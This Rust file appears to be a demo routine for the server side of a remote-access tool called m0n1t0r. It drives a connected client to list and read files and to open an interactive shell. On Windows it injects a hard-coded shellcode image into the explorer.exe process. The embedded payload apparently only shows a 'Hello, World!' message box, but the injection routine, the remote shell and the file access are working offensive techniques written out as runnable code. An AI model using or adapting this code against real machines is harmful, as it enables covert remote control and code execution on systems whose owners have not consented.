use crate::ServerObj;
use actix_web::web::Buf;
use anyhow::{anyhow, Result};
use m0n1t0r_common::{
    client::{Client, TargetPlatform},
    fs::Agent as _,
    process::Agent as _,
};
use std::sync::Arc;
use tokio::sync::RwLock;

pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
    let lock_obj = server.read().await;
    let client = lock_obj.get_client()?;
    let file_agent = client.get_fs_agent().await?;
    let process_agent = client.get_process_agent().await?;

    client.ping().await?;
    println!("version: {}", client.version().await?);
    println!(
        "pwd at: {}",
        file_agent.current_directory().await?.to_string_lossy()
    );
    println!("files at \"/\": {:?}", file_agent.list("/".into()).await?);
    println!(
        "Cargo.toml: \"{}\"",
        String::from_utf8_lossy(&file_agent.read("Cargo.toml".into()).await?)
    );

    let (stdin_tx, stdout_rx, _) = process_agent.interactive("sh".to_string()).await?;
    let mut stdin_tx = stdin_tx.into_inner().await?;
    let mut stdout_rx = stdout_rx.into_inner().await?;
    stdin_tx.send("echo hello\n".into()).await?;
    println!(
        "echo hello: {}",
        String::from_utf8_lossy(
            stdout_rx
                .recv()
                .await?
                .ok_or(anyhow!("channel closed"))?
                .chunk()
        )
    );

    if client.target_platform().await? == TargetPlatform::Windows {
        process_agent
            .inject_shellcode_by_id(
                process_agent
                    .get_id_by_name("explorer.exe".to_string())
                    .await?,
                vec![
                    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff,
                    0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x0e,
                    0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21,
                    0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20,
                    0x63, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e,
                    0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x2e,
                    0x0d, 0x0d, 0x0a, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x28,
                    0x09, 0xdf, 0x41, 0x49, 0x67, 0x8c, 0x41, 0x49, 0x67, 0x8c, 0x41, 0x49, 0x67,
                    0x8c, 0x09, 0xcc, 0x6e, 0x8d, 0x40, 0x49, 0x67, 0x8c, 0x09, 0xcc, 0x65, 0x8d,
                    0x40, 0x49, 0x67, 0x8c, 0x52, 0x69, 0x63, 0x68, 0x41, 0x49, 0x67, 0x8c, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x01, 0x00, 0x92, 0x80, 0x59,
                    0x67, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x23, 0x00,
                    0x0b, 0x02, 0x0e, 0x29, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                    0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x03, 0x00, 0x20, 0x80, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x0c, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x3c, 0x02, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00,
                    0x00, 0xcc, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0xbf, 0x04, 0x00, 0x00,
                    0xc0, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x33,
                    0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x65,
                    0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21, 0x00, 0x00,
                    0x00, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x92, 0x80, 0x59, 0x67, 0x00, 0x00, 0x00, 0x00, 0x0d,
                    0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x8c, 0x02, 0x00, 0x00, 0x8c, 0x02,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x80, 0x59, 0x67, 0x00, 0x00, 0x00,
                    0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x47, 0x43, 0x54, 0x4c, 0x00, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00,
                    0x00, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x10, 0x02, 0x00, 0x00,
                    0x64, 0x00, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x74,
                    0x02, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61,
                    0x24, 0x76, 0x6f, 0x6c, 0x74, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x8c, 0x02, 0x00,
                    0x00, 0x78, 0x00, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7a,
                    0x7a, 0x7a, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0xbc,
                    0x01, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6d, 0x6e, 0x00, 0x00,
                    0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x2e, 0x78, 0x64,
                    0x61, 0x74, 0x61, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83,
                    0xec, 0x50, 0x0f, 0xb7, 0x05, 0x03, 0xff, 0xff, 0xff, 0xf2, 0x0f, 0x10, 0x05,
                    0xf3, 0xfe, 0xff, 0xff, 0x66, 0x89, 0x44, 0x24, 0x38, 0x8a, 0x05, 0xf2, 0xfe,
                    0xff, 0xff, 0x88, 0x44, 0x24, 0x3a, 0x8b, 0x05, 0xf6, 0xfe, 0xff, 0xff, 0x89,
                    0x44, 0x24, 0x48, 0x0f, 0xb7, 0x05, 0xef, 0xfe, 0xff, 0xff, 0xf2, 0x0f, 0x11,
                    0x44, 0x24, 0x30, 0xf2, 0x0f, 0x10, 0x05, 0xd5, 0xfe, 0xff, 0xff, 0x66, 0x89,
                    0x44, 0x24, 0x4c, 0x0f, 0xb7, 0x05, 0xe1, 0xfe, 0xff, 0xff, 0xf2, 0x0f, 0x11,
                    0x44, 0x24, 0x40, 0xf2, 0x0f, 0x10, 0x05, 0xcb, 0xfe, 0xff, 0xff, 0x66, 0x89,
                    0x44, 0x24, 0x28, 0xf2, 0x0f, 0x11, 0x44, 0x24, 0x20, 0x65, 0x48, 0x8b, 0x04,
                    0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x10,
                    0x4c, 0x8b, 0x40, 0x30, 0x49, 0x63, 0x48, 0x3c, 0x46, 0x8b, 0x94, 0x01, 0x88,
                    0x00, 0x00, 0x00, 0x4d, 0x03, 0xd0, 0x4d, 0x3b, 0xd0, 0x74, 0x4e, 0x45, 0x8b,
                    0x4a, 0x18, 0x45, 0x85, 0xc9, 0x74, 0x45, 0x41, 0x8b, 0x7a, 0x20, 0x41, 0xff,
                    0xc9, 0x41, 0xbb, 0xe4, 0xba, 0x52, 0x52, 0x4a, 0x8d, 0x0c, 0x8f, 0x42, 0x8b,
                    0x14, 0x01, 0x49, 0x03, 0xd0, 0x8a, 0x0a, 0x48, 0xff, 0xc2, 0x84, 0xc9, 0x74,
                    0x1f, 0x0f, 0xbe, 0xc9, 0x41, 0x33, 0xcb, 0x44, 0x69, 0xd9, 0x93, 0x01, 0x00,
                    0x01, 0x8a, 0x0a, 0x48, 0xff, 0xc2, 0x84, 0xc9, 0x75, 0xea, 0x41, 0x81, 0xfb,
                    0xc6, 0x40, 0x8c, 0xf9, 0x74, 0x0a, 0x45, 0x85, 0xc9, 0x75, 0xbf, 0x48, 0x8b,
                    0x00, 0xeb, 0x95, 0x41, 0x8b, 0x4a, 0x24, 0x49, 0x03, 0xc8, 0x42, 0x0f, 0xb7,
                    0x14, 0x49, 0x41, 0x8b, 0x4a, 0x1c, 0x49, 0x03, 0xc8, 0x8b, 0x04, 0x91, 0x48,
                    0x8d, 0x4c, 0x24, 0x30, 0x49, 0x03, 0xc0, 0xff, 0xd0, 0x65, 0x48, 0x8b, 0x04,
                    0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x10,
                    0x4c, 0x8b, 0x40, 0x30, 0x49, 0x63, 0x48, 0x3c, 0x46, 0x8b, 0x8c, 0x01, 0x88,
                    0x00, 0x00, 0x00, 0x4d, 0x03, 0xc8, 0x4d, 0x3b, 0xc8, 0x74, 0x4e, 0x45, 0x8b,
                    0x51, 0x18, 0x45, 0x85, 0xd2, 0x74, 0x45, 0x41, 0x8b, 0x79, 0x20, 0x41, 0xff,
                    0xca, 0x41, 0xbb, 0x48, 0x71, 0x50, 0x4b, 0x4a, 0x8d, 0x0c, 0x97, 0x42, 0x8b,
                    0x14, 0x01, 0x49, 0x03, 0xd0, 0x8a, 0x0a, 0x48, 0xff, 0xc2, 0x84, 0xc9, 0x74,
                    0x1f, 0x0f, 0xbe, 0xc9, 0x41, 0x33, 0xcb, 0x44, 0x69, 0xd9, 0x93, 0x01, 0x00,
                    0x01, 0x8a, 0x0a, 0x48, 0xff, 0xc2, 0x84, 0xc9, 0x75, 0xea, 0x41, 0x81, 0xfb,
                    0x73, 0xfc, 0x25, 0x22, 0x74, 0x0a, 0x45, 0x85, 0xd2, 0x75, 0xbf, 0x48, 0x8b,
                    0x00, 0xeb, 0x95, 0x41, 0x8b, 0x49, 0x24, 0x49, 0x03, 0xc8, 0x42, 0x0f, 0xb7,
                    0x14, 0x51, 0x41, 0x8b, 0x49, 0x1c, 0x45, 0x33, 0xc9, 0x49, 0x03, 0xc8, 0x8b,
                    0x04, 0x91, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x03, 0xc0, 0x33, 0xc9, 0x4c,
                    0x8d, 0x44, 0x24, 0x20, 0xff, 0xd0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x33, 0xc0,
                    0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0xcc, 0x01, 0x0a, 0x04, 0x00, 0x0a, 0x34,
                    0x0c, 0x00, 0x0a, 0x92, 0x06, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00,
                ],
                0x304,
                Vec::new(),
            )
            .await?;
    }

    Ok(())
}
